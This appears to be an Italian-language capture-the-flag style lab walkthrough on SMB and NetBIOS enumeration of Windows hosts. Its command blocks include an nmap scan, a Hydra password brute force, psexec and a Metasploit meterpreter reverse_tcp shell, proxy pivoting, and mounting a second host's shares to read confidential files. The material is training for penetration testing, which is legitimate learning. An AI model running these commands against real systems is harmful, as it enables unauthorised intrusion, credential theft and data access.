---
description: Windows Enumeration
---

# SMB & NetBIOS Enumeration

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Verifica ambiente di laboratorio

```
cat /etc/hosts
ping <TARGET 1>
ping <TARGET 2>
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Se guardiamo nel file hosts abbiamo due macchine:&#x20;

* demo.ine.local che è raggiungibile dal nostro sistema Kali attaccante
* demo1.ine.local che non è direttamente raggiungibile dal nostro sistema ma sarà necessario effettuare un Pivoting per raggiungerla

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Nmap scan sul primo target

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo vedere che abbiamo Netbios-SSN sulla porta 139, e SMB running sulla porta 445.

## Netbios enumeration

### Usiamo un tool nbtscan

SW free per scan delle reti con Netbios.

```
nbtscan
whatis nbtscan
nbtscan 10.4.30.0/24
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se proviamo a fare lo scan solo dell'IP del primo server demo non funziona, dobbiamo farlo dell'intera rete:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Quando eseguiamo nbtscan ci vengono mostrati tutti i nomi Netbios delle macchine sulla rete, nel caso sotto non ne abbiamo, e nella subnet dopo invece c'è qualche errore perché non ci mostra nulla:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Usiamo il tool nmblookup

Nel caso in cui non funzioni nbtscan possiamo usare nmblookup

```
nmblookup -A 10.4.30.139
// proviamo a usare un nmap scan con script per avere più info sulla porta NetBIOS
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 10.4.30.139
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ancora non risponde.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vediamo che la porta è aperta o filtrata ma non ci risponde.

Proviamo a usare un nmap con uno scan con script specifico

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nemmeno questo script ci dà informazioni aggiuntive in risposta, quindi è altamente probabile che questa porta sia bloccata da un firewall o sia in qualche modo "chiusa".

### Altro tool alternativo: nbtstat

## SMB Enumeration

```
nmap -sV -p 139,445 demo.ine.local
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Enumerazione con script nmap

Per controllare gli script di nmap:

```
ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



Utilizziamo il motore nmap scripting engine per enumerare la versione di SMB:

```
nmap -p455 --script smb-protocols demo.ine.local
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo vedere che abbiamo la porta SMB aperta, e abbiamo SMBv1 che è pericolosa e vedremo perché, e anche le versioni 2, 2.1 e 3.0.

Quindi ora vedremo come sfruttare la versione vulnerabile. Però prima vogliamo identificare i livelli di sicurezza del protocollo SMB.

### Verificare il livello di sicurezza di SMB configurato

```
nmap -p445 --script smb-security-mode demo.ine.local
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Qui ci dice che lo script è stato eseguito come guest, livello di autenticazione "utente", è supportato e la firma dei messaggi è disabilitata. Quindi si può accedere come guest user, che è un utente di default in tutte le versioni di windows.

Proviamo a testare specifiche vulnerabilità legate a SMB v1 come anonymous access:

```
smbclient -L demo.ine.local //e premiamo enter senza inserire una password per testare l'accesso anonimo
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Considerando ora che abbiamo accesso come anonymous con SMB v1 possiamo fare una username enumeration del windows system attraverso SMB.

### Enumerazione degli utenti del PC Windows

```
nmap -p445 --script smb-enum-users.nse 10.4.30.139
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possiamo quindi vedere che l'hostname è ATTACKDEFENSE e l'RID di admin e Administrator, Guest e root. Con anche info sulla scadenza della password.

Ora potremmo usare queste info per fare un bruteforce su questi account, in particolare i primi due.

E poi possiamo usare un tool tipo psexec per autenticarci con SMB e avere un cmd.

### Creazione di un file users.txt

```
vim users.txt
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Brute force delle password degli utenti

Usiamo Hydra come tool, ma potremmo usare anche crackmapexec (che copriremo nel corso del lateral movement).

```
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt demo.ine.local smb
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo ottenuto le password, ora possiamo collegarci alla vittima con psexec

## Colleghiamoci alla vittima con le credenziali trovate

### Usando psexec.py

```
psexec.py administrator@demo.ine.local //e inseriamo la password
//e possiamo poi fare un po' di local enumeration
whoami
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Usando il modulo psexec di MSF

```
msfconsole -q
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
set payload windows/x64/meterpreter/reverse_tcp
exploit
sysinfo
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo ora accesso al primo target, ora dobbiamo accedere al secondo tramite pivoting.

## Pivoting sul secondo target in altra rete

Riverifichiamo qual era l'IP del secondo target (demo1.ine.local)

<figure><img src="../../.gitbook/assets/image (20) (1) (1).png" alt=""><figcaption></figcaption></figure>

E ora vediamo con un ping dalla macchina vittima 1 exploitata (demo.ine.local) se possiamo raggiungerla.

### Impostiamo un system-wide proxy per poter raggiungere la seconda vittima (demo1) facendo pivoting sulla prima (demo)

```
ping 10.4.26.4
// funziona quindi terminiamo la sessione CMD sul target 1
// per tornare a quella meterpreter e configurare l'autoroute e fare il pivoting
run autoroute -s 10.4.26.0/20
background //mettiamo in background la sessione
// impostiamo un system-wide proxy con il modulo MSF metasploit proxy module
//verifichiamo su un altro terminale la versione di proxychains installata e la porta configurata con: cat /etc/proxychains.conf o /etc/proxychains4.conf
search socks
use auxiliary/server/socks_proxy
show options
set VERSION 4a //perché usiamo socks4
set SRVPORT 9050 //perché è quella configurata in /etc/proxychains4.conf
exploit
// ora che abbiamo un system-wide proxy possiamo fare una verifica spostandoci in un altro terminale:
```

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Verifichiamo velocemente di avere proxychains.conf o proxychains4.conf sulla macchina attaccante:

<figure><img src="../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo /etc/proxychains4.conf:

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

Torniamo quindi a metasploit:

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

### Enumeration delle shares della seconda vittima demo1.ine.local, le montiamo sulla prima vittima e ne accediamo al contenuto

```
// ora che abbiamo un system-wide proxy possiamo fare una verifica spostandoci in un altro terminale:
    netstat -antp //e troviamo la porta 9050 in ascolto sul sistema
    proxychains nmap demo1.ine.local -sT -Pn -sV -p 445 //ora è raggiungibile dal sistema kali attaccante. -sT è per standard TCP connect scan
    //e troviamo un sistema windows running sul target demo1.
// torniamo sulla sessione iniziale in meterpreter (quella dentro demo.ine.local) sul terminale 1 e 
//   vediamo se riusciamo a interagire con il secondo target demo1.ine.local
sessions 2
shell
net view 10.4.26.4
// ci dà errore quindi proviamo a terminare con CTRL+C la sessione cmd per tornare a quella meterpreter
migrate -N explorer.exe
shell 
net view 10.4.26.4 //ed ora ci dà un risultato con le shares condivise da demo1
//assegniamo ora delle lettere (Drive letters) a ognuna delle cartelle condivise da demo1, per navigarle dal file system di demo
net use D: \\10.4.26.4\Documents
net use K: \\10.4.26.4\K$
dir D:  //così vediamo che in D c'è un file Confidential.txt e FLAG2.txt
dir K:  //così vediamo che in K c'è un altro file txt
```

Ora che abbiamo configurato il system-wide proxy possiamo fare una verifica spostandoci in un altro terminale:

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Ed infatti abbiamo la porta 9050 in ascolto sul sistema.

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Ora possiamo spostarci sulla sessione iniziale in meterpreter (quella dentro demo.ine.local) sul terminale 1 e vediamo se riusciamo a interagire con il secondo target demo1.ine.local.

Vediamo di interagire e enumerare le risorse condivise da demo1.ine.local:

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Vediamo che net view fallisce.

Attualmente siamo su questo sistema con i privilegi più elevati e proviamo a migrare a qualche altro processo come explorer e rieseguire net view.

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Ed ora che siamo riusciti a connetterci andiamo a mappare le cartelle che sono visibili da parte di 10.4.26.4 (demo1) sulla prima vittima demo alla quale siamo connessi, e poi andiamo ad analizzarne il contenuto.

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Volendo possiamo ora visualizzare la FLAG2. Siamo riusciti ad accedere ai file della seconda vittima (demo1) montando le cartelle condivise (le shares) sulla prima vittima (demo) a cui avevamo ottenuto accesso tramite psexec a seguito del brute force delle credenziali.
